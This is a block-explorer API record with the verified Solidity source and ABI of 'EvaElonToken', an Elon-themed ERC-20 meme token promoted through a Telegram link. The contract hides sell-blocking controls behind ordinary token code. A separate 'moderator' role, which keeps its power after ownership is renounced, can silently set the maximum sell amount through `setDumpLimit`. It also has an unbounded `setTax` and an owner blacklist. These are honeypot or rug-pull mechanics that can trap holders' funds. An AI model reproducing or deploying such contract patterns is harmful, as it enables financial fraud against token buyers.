{"status":"1","message":"OK","result":[{"SourceCode":"/**\r\n * TELEGRAM t.me/EvaElonToken\r\n * Elon's tweet play\r\n*/\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.8.4;\r\n\r\nabstract contract Context {\r\n\tfunction _msgSender() internal view virtual returns (address) {\r\n\t\treturn msg.sender;\r\n\t}\r\n}\r\n\r\ninterface IERC20 {\r\n\tfunction totalSupply() external view returns (uint256);\r\n\r\n\tfunction balanceOf(address account) external view returns (uint256);\r\n\r\n\tfunction transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n\tfunction allowance(address owner, address spender) external view returns (uint256);\r\n\r\n\tfunction approve(address spender, uint256 amount) external returns (bool);\r\n\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\r\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\tuint256 c = a + b;\r\n\t\trequire(c >= a, \"SafeMath: addition overflow\");\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\treturn sub(a, b, \"SafeMath: subtraction overflow\");\r\n\t}\r\n\r\n\tfunction sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\t\trequire(b <= a, errorMessage);\r\n\t\tuint256 c = a - b;\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\tif (a == 0) {\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\tuint256 c = a * b;\r\n\t\trequire(c / a == b, \"SafeMath: multiplication overflow\");\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\treturn div(a, b, \"SafeMath: division by zero\");\r\n\t}\r\n\r\n\tfunction div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\t\trequire(b > 0, errorMessage);\r\n\t\tuint256 c = a / b;\r\n\t\treturn c;\r\n\t}\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n\taddress private _owner;\r\n\r\n\tevent OwnershipTransferred(address indexed oldie, address indexed newbie);\r\n\r\n\tconstructor () {\r\n\t\taddress msgSender = _msgSender();\r\n\t\t_owner = msgSender;\r\n\t\temit OwnershipTransferred(address(0), msgSender);\r\n\t}\r\n\r\n\tfunction owner() public view returns (address) {\r\n\t\treturn _owner;\r\n\t}\r\n\r\n\tmodifier onlyOwner() {\r\n\t\trequire(_owner == _msgSender() , \"Ownable: caller is not the owner\");\r\n\t\t_;\r\n\t}\r\n\r\n\tfunction renounceOwnership() public virtual onlyOwner {\r\n\t\temit OwnershipTransferred(_owner, address(0));\r\n\t\t_owner = address(0);\r\n\t}\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n\tfunction createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n\tfunction swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n\tfunction factory() external pure returns (address);\r\n\tfunction WETH() external pure returns (address);\r\n\tfunction addLiquidityETH(address token, uint amountTokenDesired,uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract EvaElonToken is Context, IERC20, Ownable {\r\n\tusing SafeMath for uint256;\r\n\tmapping(address => uint256) private _rOwned;\r\n\tmapping(address => mapping(address => uint256)) private _allowances;\r\n\tmapping(address => bool) private _isExcludedFromFee;\r\n\tmapping(address => bool) private bots;\r\n\tmapping(address => uint) private cooldown;\r\n\tuint256 private constant MAX = ~uint256(0);\r\n\tuint256 private _tTotal = 200000000 ;\r\n\tuint256 private _rTotal = (MAX - (MAX % _tTotal));\r\n\tuint256 private _tFeeTotal;\r\n\r\n\tuint256 private _taxAddr1;\r\n\tuint256 private _taxAddr2;\r\n\taddress payable private _taxAddrWallet1;\r\n\taddress payable private _taxAddrWallet2;\r\n\r\n\tstring private constant _name = \"EvaElonToken\";\r\n\tstring private constant _symbol = \"EvaElon\";\r\n\tuint8 private constant _decimals = 0;\r\n\r\n\tIUniswapV2Router02 private uniswapV2Router;\r\n\taddress private uniswapV2Pair;\r\n\tbool private tradingOpen;\r\n\tbool private inSwap = false;\r\n\tbool private swapEnabled = false;\r\n\tbool private cooldownEnabled = false;\r\n\taddress private _moderator;\r\n\tuint256 private _maxDump = _tTotal;\r\n\tevent MaxDumpAmountUpdated(uint _maxDump);\r\n\tmodifier lockTheSwap {\r\n\t\tinSwap = true;\r\n\t\t_;\r\n\t\tinSwap = false;\r\n\t}\r\n\tconstructor () {\r\n\t\t_taxAddrWallet1 = payable(0x678673C1DAa1Dd7DF5B0f19133B1f591b1311632);\r\n\t\t_taxAddrWallet2 = payable(0x678673C1DAa1Dd7DF5B0f19133B1f591b1311632);\r\n\t\t_rOwned[_msgSender()] = _rTotal;\r\n\t\t_isExcludedFromFee[owner()] = true;\r\n\t\t_isExcludedFromFee[address(this)] = true;\r\n\t\t_moderator=owner();\r\n\t\tuniswapV2Router =  IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\t\t_isExcludedFromFee[_taxAddrWallet1] = true;\r\n\t\t_isExcludedFromFee[_taxAddrWallet2] = true;\r\n\t\t_taxAddr1 = 1;\r\n\t\t_taxAddr2 = 8;\r\n\t\temit Transfer(address(0x0000000000000000000000000000000000000000), _msgSender(), _tTotal);\r\n\t}\r\n\r\n\tfunction name() public pure returns (string memory) {\r\n\t\treturn _name;\r\n\t}\r\n\r\n\tfunction symbol() public pure returns (string memory) {\r\n\t\treturn _symbol;\r\n\t}\r\n\r\n\tfunction decimals() public pure returns (uint8) {\r\n\t\treturn _decimals;\r\n\t}\r\n\r\n\tfunction totalSupply() public  view override returns  (uint256) {\r\n\t\treturn _tTotal;\r\n\t}\r\n\r\n\tfunction balanceOf(address account) public view override returns (uint256) {\r\n\t\treturn tokenFromReflection(_rOwned[account]);\r\n\t}\r\n\r\n\tfunction transfer(address recipient, uint256 amount) public override returns (bool) {\r\n\t\t_transfer(_msgSender(), recipient, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction allowance(address owner, address spender) public view override returns (uint256) {\r\n\t\treturn _allowances[owner][spender];\r\n\t}\r\n\r\n\tfunction approve(address spender, uint256 amount) public override returns (bool) {\r\n\t\t_approve(_msgSender(), spender, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n\t\t_transfer(sender, recipient, amount);\r\n\t\t_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction setCooldownEnabled(bool onoff) external onlyOwner {\r\n\t\tcooldownEnabled = onoff;\r\n\t}\r\n\r\n\tfunction tokenFromReflection(uint256 rAmount) private view returns (uint256) {\r\n\t\trequire(rAmount <= _rTotal, \"Amount must be less than total reflections\");\r\n\t\tuint256 currentRate = _getRate();\r\n\t\treturn rAmount.div(currentRate);\r\n\t}\r\n\r\n\tfunction _approve(address owner, address spender, uint256 amount) private {\r\n\t\trequire(owner != address(0), \"ERC20: approve from the zero address\");\r\n\t\trequire(spender != address(0), \"ERC20: approve to the zero address\");\r\n\t\t_allowances[owner][spender] = amount;\r\n\t\temit Approval(owner, spender, amount);\r\n\t}\r\n\r\n\tfunction setTax(uint tax1, uint tax2) external onlyOwner{\r\n\t\trequire(tax1>=0 && tax2>=0,\"Tax must be non-negative\");\r\n\t\t_taxAddr1=tax1;\r\n\t\t_taxAddr2=tax2;\r\n\t}\r\n\r\n\tfunction _transfer(address from, address to, uint256 amount) private {\r\n\t\trequire(from != address(0), \"ERC20: transfer from the zero address\");\r\n\t\trequire(to != address(0), \"ERC20: transfer to the zero address\");\r\n\t\trequire(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n\t\tif (from != owner() && to != owner()) {\r\n\t\t\trequire(!bots[from] && !bots[to]);\r\n\t\t\tif (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] && cooldownEnabled) {\r\n\t\t\t\t// Cooldown\r\n\t\t\t\trequire(cooldown[to] < block.timestamp);\r\n\t\t\t\tcooldown[to] = block.timestamp + (10 seconds);\r\n\t\t\t}\r\n\r\n\t\t\tif (to == uniswapV2Pair && from != address(uniswapV2Router) && ! _isExcludedFromFee[from]) {\r\n\t\t\t\trequire(amount <= _maxDump);\r\n\t\t\t}\r\n\t\t\tuint256 contractTokenBalance = balanceOf(address(this));\r\n\t\t\tif (!inSwap && from != uniswapV2Pair && swapEnabled) {\r\n\t\t\t\tswapTokensForEth(contractTokenBalance);\r\n\t\t\t\tuint256 contractETHBalance = address(this).balance;\r\n\t\t\t\tif (contractETHBalance > 0) {\r\n\t\t\t\t\tsendETHToFee(address(this).balance);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t_tokenTransfer(from, to, amount);\r\n\t}\r\n\r\n\tfunction swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n\t\taddress[] memory path = new address[](2);\r\n\t\tpath[0] = address(this);\r\n\t\tpath[1] = uniswapV2Router.WETH();\r\n\t\t_approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\t\tuniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path,address(this), block.timestamp);\r\n\t}\r\n\r\n\tfunction sendETHToFee(uint256 amount) private {\r\n\t\t_taxAddrWallet1.transfer(amount.div(2));\r\n\t\t_taxAddrWallet2.transfer(amount.div(2));\r\n\t}\r\n\r\n\tfunction openTrading() external onlyOwner() {\r\n\t\trequire(!tradingOpen, \"Trading is already open\");\r\n\t\t_approve(address(this), address(uniswapV2Router), _tTotal);\r\n\t\tuniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n\t\tuniswapV2Router.addLiquidityETH{value : address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);\r\n\t\tswapEnabled = true;\r\n\t\tcooldownEnabled = true;\r\n\t\t_maxDump = 10000000000 * 10** 9;\r\n\t\ttradingOpen = true;\r\n\t\tIERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n\t}\r\n\r\n\tfunction setBots(address[] memory bots_) public onlyOwner {\r\n\t\tfor (uint i = 0; i < bots_.length; i++) {\r\n\t\t\tbots[bots_[i]] = true;\r\n\t\t}\r\n\t}\r\n\r\n\tmodifier moderator() {\r\n\t\trequire(_moderator == _msgSender() );\r\n\t\t_;\r\n\t}\r\n\r\n\tfunction delBot(address notbot) public onlyOwner {\r\n\t\tbots[notbot] = false;\r\n\t}\r\n\r\n\tfunction _tokenTransfer(address sender, address recipient, uint256 amount) private {\r\n\t\t_transferStandard(sender, recipient, amount);\r\n\t}\r\n\r\n\tfunction _transferStandard(address sender, address recipient, uint256 tAmount) private {\r\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);\r\n\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\r\n\t\t_takeTeam(tTeam);\r\n\t\t_reflectFee(rFee, tFee);\r\n\t\temit Transfer(sender, recipient, tTransferAmount);\r\n\t}\r\n\r\n\tfunction _takeTeam(uint256 tTeam) private {\r\n\t\tuint256 currentRate = _getRate();\r\n\t\tuint256 rTeam = tTeam.mul(currentRate);\r\n\t\t_rOwned[address(this)] = _rOwned[address(this)].add(rTeam);\r\n\t}\r\n\r\n\tfunction _reflectFee(uint256 rFee, uint256 tFee) private {\r\n\t\t_rTotal = _rTotal.sub(rFee);\r\n\t\t_tFeeTotal = _tFeeTotal.add(tFee);\r\n\t}\r\n\r\n\treceive() external payable {}\r\n\r\n\tfunction manualSwap() external {\r\n\t\trequire(_msgSender() == _taxAddrWallet1);\r\n\t\tuint256 contractBalance = balanceOf(address(this));\r\n\t\tswapTokensForEth(contractBalance);\r\n\t}\r\n\r\n\tfunction manualSend() external {\r\n\t\trequire(_msgSender() == _taxAddrWallet1);\r\n\t\tuint256 contractETHBalance = address(this).balance;\r\n\t\tsendETHToFee(contractETHBalance);\r\n\t}\r\n\r\n\tfunction _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\r\n\t\t(uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _taxAddr1, _taxAddr2);\r\n\t\tuint256 currentRate = _getRate();\r\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);\r\n\t\treturn (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);\r\n\t}\r\n\r\n\tfunction _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {\r\n\t\tuint256 tFee = tAmount.mul(taxFee).div(100);\r\n\t\tuint256 tTeam = tAmount.mul(TeamFee).div(100);\r\n\t\tuint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);\r\n\t\treturn (tTransferAmount, tFee, tTeam);\r\n\t}\r\n\r\n\tfunction _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\r\n\t\tuint256 rAmount = tAmount.mul(currentRate);\r\n\t\tuint256 rFee = tFee.mul(currentRate);\r\n\t\tuint256 rTeam = tTeam.mul(currentRate);\r\n\t\tuint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);\r\n\t\treturn (rAmount, rTransferAmount, rFee);\r\n\t}\r\n\r\n\tfunction _getRate() private view returns (uint256) {\r\n\t\t(uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\r\n\t\treturn rSupply.div(tSupply);\r\n\t}\r\n\tfunction setDumpLimit(uint256 limit) external moderator {\r\n\t\t_maxDump = limit;\r\n\t}\r\n\r\n\r\n\r\n\tfunction _getCurrentSupply() private view returns (uint256, uint256) {\r\n\t\tuint256 rSupply = _rTotal;\r\n\t\tuint256 tSupply = _tTotal;\r\n\t\tif (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\r\n\t\treturn (rSupply, tSupply);\r\n\t}\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxDump\",\"type\":\"uint256\"}],\"name\":\"MaxDumpAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldie\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newbie\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"notbot\",\"type\":\"address\"}],\"name\":\"delBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"bots_\",\"type\":\"address[]\"}],\"name\":\"setBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"onoff\",\"type\":\"bool\"}],\"name\":\"setCooldownEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limit\",\"type\":\"uint256\"}],\"name\":\"setDumpLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tax1\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tax2\",\"type\":\"uint256\"}],\"name\":\"setTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"EvaElonToken","CompilerVersion":"v0.8.4+commit.c7e474f2","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://58bae179e47b9be8866c2ec84cf893b7a829e2e5c6e8b9adb3a2e09fbe6c4070"}]}